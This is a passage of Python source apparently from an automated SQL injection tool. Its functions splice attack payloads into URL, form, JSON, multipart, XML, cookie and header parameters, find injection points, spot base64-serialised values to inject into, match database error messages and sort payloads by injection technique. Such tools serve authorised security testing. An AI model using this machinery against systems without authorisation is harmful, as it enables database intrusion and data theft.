        "Response",
        [
            "ok",
            "url",
            "text",
            "headers",
            "status_code",
            "reason",
            "error",
            "content_length",
            "filtered_text",
        ],
    )
    text = ""
    status_code = 0
    headers = {}
    error_msg = ""
    reason = ""
    if hasattr(resp, "text"):
        text = resp.text
        url = resp.url
        status_code = resp.status_code
        reason = get_http_code_reason(status_code).reason  # resp.reason
        headers = resp.headers
        ok = bool(200 == status_code)
        error_msg = f"{status_code} ({reason})"
        content_length = headers.get("Content-Length", len(text))
        filtered_text = get_filtered_page_content(text)
    else:
        url = resp.geturl()
        status_code = resp.status
        ok = bool(200 == status_code)
        reason = get_http_code_reason(status_code).reason  # resp.reason
        headers = dict(resp.info())
        text = unescape_html(
            resp, is_compressed=bool("gzip" in headers.get("Content-Encoding", ""))
        )
        text = text
        error_msg = f"{status_code} ({reason})"
        content_length = headers.get("Content-Length", len(text))
        filtered_text = get_filtered_page_content(text)
    return Response(
        ok=ok,
        url=url,
        text=text,
        headers=headers,
        status_code=status_code,
        reason=reason,
        error=error_msg,
        content_length=content_length,
        filtered_text=filtered_text,
    )


def is_deserializable(parameter, injection_type=""):
    pkey = parameter.key
    pvalue = parameter.value
    try:
        if base64.b64encode(base64.b64decode(pvalue)).decode() == pvalue:
            b64totext = base64.b64decode(pvalue + "====").decode()
            conf._deserialized_data = json.loads(b64totext)
            message = "it appears that provided value for %sparameter '%s' " % (
                "%s " % injection_type if injection_type != pkey else "",
                pkey,
            )
            message += "is JSON deserializable. Do you want to inject inside? [y/N] "
            if not conf._b64serialized_choice:
                choice = logger.read_input(message, user_input="y", batch=conf.batch)
                conf._b64serialized_choice = True
            conf._isb64serialized = True
    except Exception as e:
        logger.debug(f"error while checking if value is deserializeble {e}")
    return conf._isb64serialized


def deserializable_attack_request(
    text,
    payload,
    param="",
    injection_type="",
    time_based=False,
    encode=False,
    is_multipart=False,
):
    prepared_payload = ""
    pkey = param.key
    pvalue = param.value
    try:
        conf._deserialized_data.update(
            {
                conf._deserialized_data_param: f"{conf._deserialized_data_param_value}{payload}"
            }
        )
        value = base64.b64encode(json.dumps(conf._deserialized_data).encode()).decode()
        REGEX_GET_POST_COOKIE_INJECTION = r"(?is)(?:((?:\?| |&)?%s)(=)(%s))" % (
            f"{'' if injection_type == 'GET' else '?'}{pkey}",
            pvalue,
        )
        _ = re.search(REGEX_GET_POST_COOKIE_INJECTION, text)
        if _ and "*" in _.group(3).strip():
            prepared_payload = re.sub(
                REGEX_GET_POST_COOKIE_INJECTION, "\\1%s" % (value), text
            )
        else:
            prepared_payload = re.sub(
                REGEX_GET_POST_COOKIE_INJECTION, "\\1\\2%s" % (value), text
            )
        return prepared_payload
    except Exception as e:
        logger.error(f"error while preparing deserialized attack request: {e}")


def prepare_attack_request(
    text,
    payload,
    param="",
    injection_type="",
    time_based=False,
    encode=False,
    is_multipart=False,
):
    if conf._isb64serialized:
        prepared_payload = deserializable_attack_request(
            text,
            payload,
            param=param,
            injection_type=injection_type,
            time_based=time_based,
            encode=encode,
            is_multipart=is_multipart,
        )
        return prepared_payload
    prepared_payload = ""
    key = param.key
    value = param.value
    is_json = conf.is_json
    is_multipart = conf.is_multipart
    replace_value = bool(
        payload.startswith("if(")
        or payload.startswith("OR(")
        or payload.startswith("XOR")
        or payload.startswith("(SELEC")
        or payload.startswith("AND(")
    )
    safe = (
        "/=*()&?%;,+\"'"
        if conf.backend == "Microsoft SQL Server" and injection_type == "POST"
        else "/=*?&:;,+"
    )
    if not is_json and not key == "#1*":
        text = urlencode(
            value=text,
            safe=safe,
            decode_first=True,
            injection_type=injection_type,
            is_multipart=is_multipart,
        )
        key = urlencode(
            value=key,
            safe=safe,
            decode_first=True,
            injection_type=injection_type,
            is_multipart=is_multipart,
        )
        value = urlencode(
            value=value,
            safe=safe,
            decode_first=True,
            injection_type=injection_type,
            is_multipart=is_multipart,
        )
    if encode and not is_json:
        payload = urlencode(
            value=payload,
            decode_first=True,
            injection_type=injection_type,
            is_multipart=is_multipart,
            value_type="payload",
        )
    if encode and param.type == "" and is_json:
        payload = urlencode(
            value=payload,
            decode_first=True,
            injection_type=injection_type,
            is_multipart=is_multipart,
        )
    if conf.is_json:
        payload = urldecode(payload)
    key_to_split_by = urldecode(key)
    if (
        injection_type in ["GET", "POST", "COOKIE", "HEADER"]
        and "*" in key_to_split_by
        and key_to_split_by != "#1*"
    ):
        init, last = text.split(key_to_split_by)
        key_new = key_to_split_by.replace("*", "")
        prepared_payload = f"{init}{key_new}{payload}{last}"
    elif key == "#1*" and injection_type == "GET":
        if value == "*":
            init, last = text.split(value)
            prepared_payload = f"{init}{payload}{last}"
        else:
            ok = re.search(r"(?is)(?:/%s)" % value, text)
            prepared_payload = re.sub(
                r"(?is)(/%s)" % (value), "\\1%s" % (payload), text
            )
    elif (
        key != "#1*"
        and "*" in urldecode(value)
        and injection_type in ["GET", "POST", "COOKIE"]
    ):
        # dirty fix for when value is provided with custom injection marker
        parameter = f"{key}={value}"
        prepared_payload = re.sub(r"\*", f"{payload}", parameter)
        prepared_payload = re.sub(re.escape(parameter), prepared_payload, text)
    else:
        key = re.escape(key)
        value = re.escape(value)
        REGEX_GET_POST_COOKIE_INJECTION = r"(?is)(?:((?:\?| |&)?%s)(=)(%s))" % (
            f"{'' if injection_type == 'GET' else '?'}{key}",
            value,
        )
        REGEX_HEADER_INJECTION = r"(?is)(?:(%s)(:)(\s*%s))" % (key, value)
        REGEX_JSON_INJECTION = (
            r"(?is)(?:(['\"]%s['\"])(:)(\s*['\"\[]*)(%s)(['\"\],]*))"
            % (
                key,
                value,
            )
        )
        # REGEX_JSON_INJECTION = r"(?is)(?:(['\"]%s['\"])(:)(\s*['\"]%s)(['\"]))" % (
        #     key,
        #     json.dumps(value),
        # )  # (?is)(?:(['\"]%s['\"])(:)(\s*[\['\"]+%s)(['\"\]]))
        if injection_type in ["GET", "POST", "COOKIE"]:
            if injection_type == "POST" and is_json:
                _ = re.search(REGEX_JSON_INJECTION, text)
                REGEX_JSON_KEY_VALUE = (
                    r"(?is)(?:(?P<key>(['\"]%s['\"]))(:)\s*(?P<value>(['\"\[]*)(%s)(['\"\]]*))(?:,)?)"
                    % (key, value)
                )
                mkv = re.search(REGEX_JSON_KEY_VALUE, text)
                if _ and "*" in _.group(4).strip():
                    value = re.sub(r"\*", "", _.group(4).strip())
                    if len(value) > 0:
                        prepared_payload = re.sub(
                            REGEX_JSON_INJECTION,
                            "\\1\\2\\3%s%s\\5"
                            % (value.replace('"', '\\"'), payload.replace('"', '\\"')),
                            text,
                        )
                    else:
                        prepared_payload = re.sub(
                            REGEX_JSON_INJECTION,
                            "\\1\\2\\3%s\\5" % (payload.replace('"', '\\"')),
                            text,
                        )
                else:
                    # ugly hack for JSON based int values to convert them into string for adding a payload properly
                    v_ = "\\4%s\\5"
                    try:
                        if mkv:
                            v = mkv.group("value")
                            _mobj = re.search(r"^\d+$", v)
                            if _mobj:
                                v_ = '"\\4%s"\\5'
                    except:
                        pass
                    v_ = v_ % (payload.replace('"', '\\"'))
                    prepared_payload = re.sub(
                        REGEX_JSON_INJECTION,
                        "\\1\\2\\3%s" % (v_),
                        text,
                    )
                if replace_value:
                    prepared_payload = re.sub(
                        REGEX_JSON_INJECTION,
                        "\\1\\2\\3%s\\5" % (payload.replace('"', '\\"')),
                        text,
                    )
            else:
                _ = re.search(REGEX_GET_POST_COOKIE_INJECTION, text)
                if _ and "*" in _.group(3).strip():
                    prepared_payload = re.sub(
                        REGEX_GET_POST_COOKIE_INJECTION, "\\1\\2%s" % (payload), text
                    )
                else:
                    prepared_payload = re.sub(
                        REGEX_GET_POST_COOKIE_INJECTION, "\\1\\2\\3%s" % (payload), text
                    )
                if replace_value:
                    prepared_payload = re.sub(
                        REGEX_GET_POST_COOKIE_INJECTION, "\\1\\2%s" % (payload), text
                    )
        if injection_type in ["HEADER"]:
            _ = re.search(REGEX_HEADER_INJECTION, text)
            if _ and "*" in _.group(3).strip():
                prepared_payload = re.sub(
                    REGEX_HEADER_INJECTION, "\\1\\2\\3%s" % (payload), text
                )
                prepared_payload = replace_with(
                    prepared_payload, character="*", replace_with="", right=False
                )
            else:
                prepared_payload = re.sub(
                    REGEX_HEADER_INJECTION, "\\1\\2\\3%s" % (payload), text
                )
            if replace_value:
                prepared_payload = re.sub(
                    REGEX_GET_POST_COOKIE_INJECTION, "\\1\\2%s" % (payload), text
                )
    if is_multipart:
        REGEX_MULTIPART_INJECTION = (
            # r"(?is)(?:(Content-Disposition[^\n]+?name\s*=\s*[\"']?%s[\"']?(.*?))(%s)(\n--))"
            r"(?is)(?:(Content-Disposition[^\n]+?name\s*=\s*[\"']?%s[\"']?\s*)(%s)(\n--))"
            % (key, value)
        )
        if replace_value:
            prepared_payload = re.sub(
                # REGEX_MULTIPART_INJECTION, "\\1\\2%s\\4" % (payload), text
                REGEX_MULTIPART_INJECTION,
                "\\1%s\\3" % (payload),
                text,
            )
        else:
            _ = re.search(REGEX_MULTIPART_INJECTION, text)
            # if _ and "*" in _.group(3).strip():
            if _ and "*" in _.group(2).strip():
                prepared_payload = re.sub(
                    # REGEX_MULTIPART_INJECTION, "\\1\\2\\3%s\\4" % (payload), text
                    REGEX_MULTIPART_INJECTION,
                    "\\1\\2%s\\3" % (payload),
                    text,
                )
                prepared_payload = replace_with(
                    prepared_payload, character="*", replace_with="", right=False
                )
            else:
                prepared_payload = re.sub(
                    # REGEX_MULTIPART_INJECTION, "\\1\\2\\3%s\\4" % (payload), text
                    REGEX_MULTIPART_INJECTION,
                    "\\1\\2%s\\3" % (payload),
                    text,
                )
    if conf.is_xml:
        text = urldecode(text)
        REGEX_SOAPXML_INJECTION = r"(?is)(?:(<%s>)(%s)(</%s>))" % (
            re.escape(urldecode(key)),
            re.escape(urldecode(value)),
            re.escape(urldecode(key)),
        )
        if replace_value:
            prepared_payload = re.sub(
                REGEX_SOAPXML_INJECTION,
                "\\1%s\\3" % (payload),
                text,
            )
        else:
            _ = re.search(REGEX_SOAPXML_INJECTION, text)
            if _ and "*" in _.group(2).strip():
                prepared_payload = re.sub(
                    REGEX_SOAPXML_INJECTION,
                    "\\1\\2%s\\3" % (payload),
                    text,
                )
                prepared_payload = replace_with(
                    prepared_payload, character="*", replace_with="", right=False
                )
            else:
                prepared_payload = re.sub(
                    REGEX_SOAPXML_INJECTION,
                    "\\1\\2%s\\3" % (payload),
                    text,
                )
    # logger.debug(f"prepared payload: {prepared_payload}")
    return prepared_payload


def unescape_html(resp, show=False, is_compressed=False):
    response = ""
    if hasattr(resp, "read"):
        response = resp.read()
        if is_compressed:
            response = gzip.decompress(response)
    if hasattr(resp, "content"):
        response = resp.content
    encoding = chardet.detect(response)["encoding"]
    if not encoding:
        encoding = "utf-8"
    if show:
        logger.debug(f"declared web page charset '{encoding}'")
    if response and not isinstance(response, str):
        response = response.decode(encoding, errors="ignore")
    data = ""
    if response:
        data = html.unescape(response)
    return data


def check_booleanbased_tests(tests):
    is_vulner = False
    if tests:
        results = [i.get("response_type") for i in tests]
        is_vulner = bool(False in results and True in results)
    return is_vulner


def headers_dict_to_str(headers):
    _temp = "\n".join([f"{k}: {v}" for k, v in headers.items()])
    return _temp


def extract_multipart_formdata(data):
    _temp = []
    REGEX_MULTIPART = r"(?is)((Content-Disposition[^\n]+?name\s*=\s*[\"']?(?P<name>(.*?))[\"']?)(?:;\s*filename=[\"']?(?P<filename>(.*?))[\"']?)?(?:\nContent-Type:\s*(?P<contenttype>(.*?))\n)?(?:\s*)?(?P<value>[\w\.\@_\-\*\+\[\]\=\>\;\:\'\"\?\/\<\.\,\!\@\#\$\%\^\&\*\(\)\_\+\`\~\{\}\|\\ ]*)?(\s)+--)"  # r"(?is)((Content-Disposition[^\n]+?name\s*=\s*[\"']?(?P<name>(.*?))[\"']?)(?:;\s*filename=[\"']?(?P<filename>(.*?))[\"']?)?(?:\nContent-Type:\s*(?P<contenttype>(.*?))\n)?(?:\s*)?(?P<value>[\w\.\@_\-\*\+\[\]]*)?(\s)+--)"
    for entry in re.finditer(REGEX_MULTIPART, data):
        _out = {}
        if entry:
            _gdict = entry.groupdict()
            key = _gdict.get("name")
            value = _gdict.get("value")
            _out.update({"key": key})
            if "contenttype" in _gdict.keys():
                filename = _gdict.get("filename")
                filename = "" if not filename else filename
                content_type = _gdict.get("contenttype")
                content_type = "" if not content_type else content_type
                if content_type:
                    value = ""
            _out.update({"value": value})
        if _out:
            _out.update({"type": "MULTIPART "})
            _temp.append(_out)
    return _temp


def fetch_payloads_by_suffix_prefix(
    payloads, prefix=None, suffix=None, is_parameter_replace=False
):
    _temp = []
    logger.debug(f"prefix=('{prefix}'), suffix=('{suffix}')")
    if is_parameter_replace:
        # in case of payload type is parameter replace then we don't need prefix and suffix in that case
        # we will use the default payload base prefixes and suffixes if any from Ghauri
        prefix = None
        suffix = None
    Payload = collections.namedtuple("Payload", ["prefix", "suffix", "string", "raw"])
    if prefix == "" and suffix == "":
        payload = payloads[-1].raw
        _temp = [
            Payload(
                prefix=prefix,
                suffix=suffix,
                string=f"{prefix}{payload}{suffix}",
                raw=payload,
            )
        ]
    if prefix == None and suffix == None:
        _temp = payloads
    if (prefix or prefix == "") and suffix == None:
        prefix = urldecode(prefix)
        payload = payloads[-1].raw
        suf_seen = set()
        for entry in payloads:
            if entry.suffix not in suf_seen:
                suf_seen.add(entry.suffix)
                _payload = Payload(
                    prefix=prefix,
                    suffix=entry.suffix,
                    string=f"{prefix}{payload}{entry.suffix}",
                    raw=payload,
                )
                _temp.append(_payload)
    if (suffix or suffix == "" or isinstance(suffix, list)) and prefix == None:
        if isinstance(suffix, list):
            suffix = "--"
        payload = payloads[-1].raw
        suffix = urldecode(suffix)
        pref_seen = set()
        for entry in payloads:
            if entry.prefix not in pref_seen:
                pref_seen.add(entry.prefix)
                _payload = Payload(
                    prefix=entry.prefix,
                    suffix=suffix,
                    string=f"{entry.prefix}{payload}{suffix}",
                    raw=payload,
                )
                _temp.append(_payload)
    if prefix is not None and suffix is not None:
        if isinstance(suffix, list):
            suffix = "--"
        payload = payloads[-1].raw
        if prefix and prefix[-1] in [")", "'", '"']:
            if not prefix.endswith(" "):
                prefix += " "
        _temp = [
            Payload(
                prefix=prefix,
                suffix=suffix,
                string=f"{prefix}{payload}{suffix}",
                raw=payload,
            )
        ]
    return _temp


def extract_json_data(data):
    if hasattr(data, "items"):
        for key, value in data.items():
            if isinstance(value, dict):
                extract_json_data(value)
            elif isinstance(value, list):
                for i in value:
                    if isinstance(i, dict):
                        extract_json_data(i)
                    if isinstance(i, str):
                        conf._json_post_data.append(
                            {"key": key, "value": i, "type": "JSON "}
                        )
            elif isinstance(value, (str, int)):
                conf._json_post_data.append(
                    {"key": key, "value": "{}".format(value), "type": "JSON "}
                )
    else:
        if isinstance(data, list):
            for entry in data:
                extract_json_data(entry)
    # logger.debug(conf._json_post_data)
    return conf._json_post_data


def check_injection_points_for_level(level, obj):
    is_ok = False
    custom_injection_in = obj.custom_injection_in
    injection_points = obj.injection_point
    GET = injection_points.get("GET", [])
    POST = injection_points.get("POST", [])
    COOKIES = injection_points.get("COOKIE", [])
    HEADERS = injection_points.get("HEADER", [])
    if custom_injection_in:
        is_ok = True
    else:
        if level == 1:
            if GET or POST:
                is_ok = True
        if level == 2:
            if GET or POST or COOKIES:
                is_ok = True
        if level == 3:
            if GET or POST or COOKIES or HEADERS:
                is_ok = True
    return is_ok


def extract_uri_params(url, batch=False):
    _injection_points = {}
    custom_injection_in = []
    is_multipart = False
    is_json = False
    is_xml = False
    InjectionPoints = collections.namedtuple(
        "InjectionPoints",
        [
            "custom_injection_in",
            # "injection_points",
            "is_multipart",
            "is_json",
            "injection_point",
            "is_xml",
        ],
    )
    if url:
        parsed = urlparse(url)
        path = parsed.path
        # extracting URI params such as files and folders
        endpoints = [i for i in path.split("/") if i and i != ""]
        is_uri_test_allowed = False
        if len(endpoints) >= 1:
            logger.warning(
                "you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'"
            )
            uri_choice = logger.read_input(
                "do you want to try URI injections in the target URL itself? [Y/n/q]",
                user_input="Y",
                batch=batch,
            )
            if uri_choice == "y":
                is_uri_test_allowed = True
        if len(endpoints) >= 1 and is_uri_test_allowed:
            folders = [i.strip() for i in endpoints[:-1] if i]
            ep = endpoints[-1]
            _tempf = []
            for entry in folders:
                _tempf.append({"key": "#1*", "value": f"{entry}", "type": ""})
            if len(ep) >= 1:
                if "." in ep:
                    ep, ext = [i.strip() for i in ep.rsplit(".", 1)]
                else:
                    ep, ext = ep, ""
                _tempf.append({"key": "#1*", "value": f"{ep}", "type": ""})
            _tempf.reverse()
            _injection_points.update({"GET": _tempf})
        # end extracting URI params such as files and folders
    for _type, _params in _injection_points.items():
        for entry in _params:
            key = entry.get("key")
            value = entry.get("value")
            # logger.debug(f"type: {_type}, param: {entry}")
            if value and "*" in value:
                custom_injection_in.append(_type)
            if key and "*" in key and key != "#1*":
                custom_injection_in.append(_type)
    injection_point = {}
    for _type, _params in _injection_points.items():
        _ = []
        for entry in _params:
            p = Struct(**entry)
            if p.key in AVOID_PARAMS:
                continue
            _.append(p)
        injection_point.update({_type: _})
    _temp = InjectionPoints(
        custom_injection_in=list(set(custom_injection_in)),
        # injection_points=_injection_points,
        is_multipart=is_multipart,
        is_json=is_json,
        injection_point=injection_point,
        is_xml=is_xml,
    )
    logger.debug((f"URI processed params: {_temp}"))
    return _temp


def extract_injection_points(url="", data="", headers="", cookies="", delimeter=""):
    _injection_points = {}
    custom_injection_in = []
    is_multipart = False
    is_json = False
    is_xml = False
    InjectionPoints = collections.namedtuple(
        "InjectionPoints",
        [
            "custom_injection_in",
            # "injection_points",
            "is_multipart",
            "is_json",
            "injection_point",
            "is_xml",
        ],
    )
    if headers:
        delimeter = "\n"
        out = [i.strip() for i in headers.split(delimeter)]
        params = [
            {
                "key": i.split(":")[0].strip(),
                "value": i.split(":")[-1].strip(),
                "type": "",
            }
            for i in out
        ]
        _temp = []
        for entry in params:
            v = entry.get("value")
            k = entry.get("key")
            # Patterns often seen in HTTP headers containing custom injection marking character '*'
            PROBLEMATIC_CUSTOM_INJECTION_PATTERNS = r"(;q=[^;']+)|(\*/\*)"
            _ = re.sub(PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, "", v or "")
            if "*" in _:
                _temp.append(entry)
            if k in INJECTABLE_HEADERS_DEFAULT:
                _temp.append(entry)
        if _temp:
            _injection_points.update({"HEADER": _temp})
        delimeter = ""
    if cookies:
        if not delimeter:
            if ":" in cookies:
                cookies = cookies.split(":", 1)[-1].strip()
            delimeter = ";"
        out = [i.strip() for i in cookies.split(delimeter)]
        params = [
            {
                "key": i.split("=")[0].strip(),
                "value": i.split("=")[-1].strip(),
                "type": "",
            }
            for i in out
            if i
        ]
        if params:
            _injection_points.update({"COOKIE": params})
    if data:
        # checking if post data is multipart data or not
        try:
            data = json.loads(data)
            is_json = True
        except ValueError:
            pass
        if is_json:
            params = extract_json_data(data)
            if not params:
                is_json = False
        else:
            MULTIPART_RECOGNITION_REGEX = r"(?i)Content-Disposition:[^;]+;\s*name="
            mobj = re.search(MULTIPART_RECOGNITION_REGEX, data)
            if mobj:
                is_multipart = True
            XML_RECOGNITION_REGEX = r"(?s)\A\s*<[^>]+>(.+>)?\s*\Z"
            xmlmobj = re.search(XML_RECOGNITION_REGEX, data)
            if xmlmobj:
                is_xml = True
            if is_multipart:
                params = extract_multipart_formdata(data)
            elif is_xml:
                params = [
                    i.groupdict()
                    for i in re.finditer(
                        r"(<(?P<key>[^>]+)( [^<]*)?>)(?P<value>([^<]*))(</\2)", data
                    )
                ]
                params = [
                    {"key": i.get("key"), "value": i.get("value"), "type": "SOUP "}
                    for i in params
                ]
            else:
                params = parse_qs(data.strip(), keep_blank_values=True)
                params = [
                    {
                        "key": k.strip(),
                        "value": v[-1].strip()
                        if len(v) > 1
                        else "".join(v).strip(),  # "".join(v).replace("+", "%2b"),
                        "type": "",
                    }
                    for k, v in params.items()
                ]
        if params:
            _injection_points.update({"POST": params})
    if url:
        parsed = urlparse(url)
        path = parsed.path
        params = parse_qs(parsed.query, keep_blank_values=True)
        params = [
            {
                "key": k.strip(),
                "value": "".join(v),
                "type": "",
            }
            for k, v in params.items()
        ]
        if not params and path and path != "/" and "*" in path:
            params = [
                {
                    "key": "#1*",
                    "value": "*",
                    "type": "",
                }
            ]
        _injection_points.update({"GET": params})
    for _type, _params in _injection_points.items():
        for entry in _params:
            key = entry.get("key")
            value = entry.get("value")
            # logger.debug(f"type: {_type}, param: {entry}")
            if value and "*" in value:
                custom_injection_in.append(_type)
            if key and "*" in key and key != "#1*":
                custom_injection_in.append(_type)
    injection_point = {}
    for _type, _params in _injection_points.items():
        _ = []
        for entry in _params:
            p = Struct(**entry)
            if p.key in AVOID_PARAMS:
                continue
            _.append(p)
        injection_point.update({_type: _})
    sorted_injection_points = collections.OrderedDict()
    sorted_injection_points.update(
        {
            "GET": injection_point.get("GET", []),
            "POST": injection_point.get("POST", []),
            "COOKIE": injection_point.get("COOKIE", []),
            "HEADER": injection_point.get("HEADER", []),
        }
    )
    sorted_injection_points = dict(sorted_injection_points)
    _temp = InjectionPoints(
        custom_injection_in=list(set(custom_injection_in)),
        is_multipart=is_multipart,
        is_json=is_json,
        injection_point=sorted_injection_points,
        is_xml=is_xml,
    )
    logger.debug(sorted_injection_points)
    return _temp


def prepare_custom_headers(
    host="", header="", cookies="", headers="", referer="", user_agent=""
):
    _headers = {}
    raw_cookies = ""
    custom_headers = ""
    Headers = collections.namedtuple(
        "Headers",
        ["headers", "raw_cookies", "raw_full_headers"],
    )
    if host:
        custom_headers += f"Host: {host}\n"
    if user_agent:
        custom_headers += f"User-agent: {user_agent}\n"
    if referer:
        custom_headers += f"Referer: {referer}\n"
    if header and ":" in header:
        custom_headers += f"{header}\n"
    if headers and ":" in headers:
        if "\\n" in headers:
            headers = headers.replace("\\n", "\n")
        custom_headers += f"{headers}\n"
    if cookies:
        raw_cookies = f"Cookie: {cookies}"
        custom_headers += raw_cookies
    for entry in custom_headers.rstrip().split("\n"):
        line = [i.strip() for i in entry.strip().split(":")]
        if len(line) == 2:
            _headers.update({line[0]: line[-1]})
    custom_headers = "\n".join([i.strip() for i in custom_headers.rstrip().split("\n")])
    _temp = Headers(
        headers=_headers, raw_cookies=raw_cookies, raw_full_headers=custom_headers
    )
    return _temp


def search_possible_dbms_errors(html):
    """check SQL error is in HTML or not"""
    html = get_filtered_page_content(html)
    Response = collections.namedtuple("DBMS", ["error", "possible_dbms"])
    _temp = Response(error=None, possible_dbms=None)
    for possible_dbms, errors in SQL_ERRORS.items():
        is_found = False
        for error in errors:
            err = re.compile(error)
            mobj = err.search(html)
            if mobj:
                groups = "".join(list(mobj.groups()))
                _temp = Response(error=groups, possible_dbms=possible_dbms)
                is_found = True
        if is_found:
            break
    return _temp


def get_user_agent(random=False):
    # latest one  at: 21-Nov-2024
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    headers = {}
    if random:
        try:
            if conf._random_ua:
                if conf._is_mobile_ua:
                    obj = ua_generator.generate(
                        browser=("chrome", "firefox", "safari"),
                        platform=("ios", "android"),
                        device="mobile",
                    )
                else:
                    obj = ua_generator.generate(
                        browser=("chrome", "firefox", "safari"),
                        platform=("windows", "linux", "macos"),
                        device="desktop",
                    )
                ua = obj.text
                headers = obj.headers.get()
            else:
                ua = ua
        except:
            ua = ua
        if not conf._random_ua_string:
            headers.pop("user-agent")
            conf._random_ua_string = ua
            conf._random_agent_dict = headers
            logger.info(
                f"fetched random HTTP User-Agent header value '{conf._random_ua_string}'"
            )
    else:
        conf._random_ua_string = ua
    return conf._random_ua_string


def prepare_request(url, data, custom_headers, use_requests=False):
    Response = collections.namedtuple(
        "Response", ["raw", "path", "headers", "request", "endpoint"]
    )
    request_type = "GET"
    if url and data:
        request_type = "POST"
    parsed = urlparse(url)
    endpoint = parsed.path
    path = parsed.path if not parsed.query else f"{parsed.path}?{parsed.query}"
    if not path:
        path = "/"
    if not custom_headers:
        custom_headers = f"User-agent: {conf._random_ua_string}"
        if custom_headers and "user-agent" not in custom_headers.lower():
            custom_headers += f"\nUser-agent: {conf._random_ua_string}"
        if custom_headers and "host" not in custom_headers.lower():
            custom_headers += f"\nHost: {parsed.netloc}"
        if custom_headers and "cache-control" not in custom_headers.lower():
            custom_headers += "\nCache-Control: no-cache"
        if custom_headers and "accept" not in custom_headers.lower():
            custom_headers += "\nAccept: */*"
        if custom_headers and "accept-encoding" not in custom_headers.lower():
            custom_headers += "\nAccept-Encoding: none"
        if custom_headers and "connection" not in custom_headers.lower():
            custom_headers += "\nConnection: close"
    custom_headers = "\n".join([i.strip() for i in custom_headers.split("\n") if i])
    raw = f"{request_type} {path} HTTP/1.1\n"
    raw += f"{custom_headers if custom_headers else ''}\n"
    if data:
        data = re.sub(r"[\n]+", "", data)
        raw += f"\n{data}\n"
    header = {}
    headers = custom_headers.split("\n")
    for i in headers:
        sph = [i.strip() for i in i.split(":", 1)]
        if sph and len(sph) == 2:
            header.update({sph[0].strip(): sph[1].strip()})
    if not use_requests:
        custom_headers = header
    else:
        custom_headers = header
    resp = Response(
        raw=raw,
        path=path,
        headers=custom_headers,
        request={"url": url, "data": data, "headers": header},
        endpoint=endpoint,
    )
    return resp


def prepare_response(resp):
    raw_response = (
        f"[#{conf.request_counter}]:\nHTTP/1.1 {resp.status_code} {resp.reason}\n"
    )
    raw_headers = "\n".join([f"{k}: {v}" for k, v in resp.headers.items()])
    raw_response += f"{raw_headers}"
    if hasattr(resp, "url"):
        raw_response += f"\nURI: {resp.url}"
    return raw_response


def clean_dups(payloads):
    _temp = []
    s = set()
    for entry in payloads:
        title = entry.title
        if title.lower() not in s:
            s.add(title.lower())
            _temp.append(entry)
    return _temp


def fetch_db_specific_payload(
    dbms=None,
    timebased_only=False,
    booleanbased_only=False,
    error_based_only=False,
    stack_queries_only=False,
):
    _temp = []
    if dbms:
        _all_dbms = [i.strip() for i in PAYLOADS.keys()]
        for _dbms in _all_dbms:
            if dbms and dbms.lower() == _dbms.lower():
                dbms = _dbms
    if dbms:
        dbms_dict = PAYLOADS.get(dbms)
        if dbms_dict:
            payloads = dbms_dict
            _temp = prepare_payloads(
                payloads,
                dbms=dbms,
                timebased_only=timebased_only,
                booleanbased_only=booleanbased_only,
                error_based_only=error_based_only,
                stack_queries_only=stack_queries_only,
            )
    if not dbms:
        # fetch only boolean based and blind based payloads as we can't identify the backend dbms
        for _, entry in PAYLOADS.items():
            ok = prepare_payloads(
                entry,
                dbms=_,
                timebased_only=timebased_only,
                booleanbased_only=booleanbased_only,
                error_based_only=error_based_only,
                stack_queries_only=stack_queries_only,
            )
            if ok:
                _temp.extend(ok)
    # experimental..
    if conf.test_filter:
        _filtered_tests = []
        for t in _temp:
            title = t.title
            mobj = re.search(r"(?:%s)" % (re.escape(conf.test_filter)), title)
            if mobj:
                logger.debug(f"{title} ==> {conf.test_filter}")
                _filtered_tests.append(t)
        if _filtered_tests:
            _temp = _filtered_tests
    return _temp


def prepare_payloads(
    payloads,
    dbms=None,
    timebased_only=False,
    booleanbased_only=False,
    error_based_only=False,
    stack_queries_only=False,
):
    Payload = collections.namedtuple("Payload", ["prefix", "suffix", "string", "raw"])
    Response = collections.namedtuple(
        "Response", ["dbms", "type", "title", "payloads", "vector"]
    )
    _temp = []
    if timebased_only:
        entries = payloads.get("time-based", [])
        for entry in entries:
            _ = entry.get("payload")
            title = entry.get("title")
            comments = entry.get("comments", [])
            vector = entry.get("vector", "")
            backend = entry.get("dbms", "")
            if backend and dbms:
                backend = dbms
            elif backend and not dbms:
                backend = backend
            else:
                backend = None
            __temp = []
            for comment in comments:
                pref = comment.get("pref")
                suf = comment.get("suf")
                _p = Payload(
                    prefix=pref,
                    suffix=suf,
                    string="{}{}{}".format(pref, _, suf),
                    raw=_,
                )
                __temp.append(_p)
            _r = Response(
                dbms=backend,
                type="time-based",
                title=title,
                payloads=__temp,
                vector=vector,
            )
            _temp.append(_r)
    if stack_queries_only:
        entries = payloads.get("stacked-queries", [])
        for entry in entries:
            _ = entry.get("payload")
            title = entry.get("title")
            comments = entry.get("comments", [])
            vector = entry.get("vector", "")
            backend = entry.get("dbms", "")
            if backend and dbms:
                backend = dbms
            elif backend and not dbms:
                backend = backend
            else:
                backend = None
            __temp = []
            for comment in comments:
                pref = comment.get("pref")
                suf = comment.get("suf")
                _p = Payload(
                    prefix=pref,
                    suffix=suf,
                    string="{}{}{}".format(pref, _, suf),
                    raw=_,
                )
                __temp.append(_p)
            _r = Response(
                dbms=backend,
                type="stacked-queries",
                title=title,
                payloads=__temp,
                vector=vector,
            )
            _temp.append(_r)
    if booleanbased_only:
        entries = payloads.get("boolean-based", [])
        for entry in entries:
            _ = entry.get("payload")
            title = entry.get("title")
            comments = entry.get("comments", [])
            vector = entry.get("vector", "")
            backend = entry.get("dbms", "")
            if backend and dbms:
                backend = dbms
            elif backend and not dbms:
                backend = backend
            else:
                backend = None
            __temp = []
            for comment in comments:
                pref = comment.get("pref")
                suf = comment.get("suf")
                _p = Payload(
                    prefix=pref,
                    suffix=suf,
                    string="{}{}{}".format(pref, _, suf),
                    raw=_,
                )
                __temp.append(_p)
            _r = Response(
                dbms=backend,
                type="boolean-based",
                title=title,
                payloads=__temp,
                vector=vector,
            )
            _temp.append(_r)
    if error_based_only:
        entries = payloads.get("error-based", [])
        for entry in entries:
            _ = entry.get("payload")
            title = entry.get("title")
            comments = entry.get("comments", [])
            vector = entry.get("vector", "")
            backend = entry.get("dbms", "")
